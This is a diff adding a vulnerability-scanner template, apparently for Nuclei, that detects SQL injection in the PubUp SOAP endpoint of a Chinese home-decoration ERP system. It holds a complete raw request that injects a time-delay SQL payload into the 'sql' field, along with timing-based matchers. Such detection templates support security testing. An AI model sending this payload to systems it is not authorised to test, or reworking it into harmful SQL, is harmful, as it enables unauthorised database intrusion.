@@ -1,0 +1,47 @@
+id: znfit-erp-ms-pubup-sqli
+info:
+  name: 家装ERP管理系统 PubUp SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL injection vulnerability in PubUp function of 家装ERP管理系统 allows remote attackers to execute arbitrary SQL commands.
+
+variables:
+  t1: "{{rand_int(4,9)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |-
+        POST /WEB_SERVICE/Public.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/PubUp"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <PubUp xmlns="http://tempuri.org/">
+              <sql>;WAITFOR DELAY '0:0:{{t1}}'--</sql>
+            </PubUp>
+          </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<PubUpResult>true</PubUpResult>"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
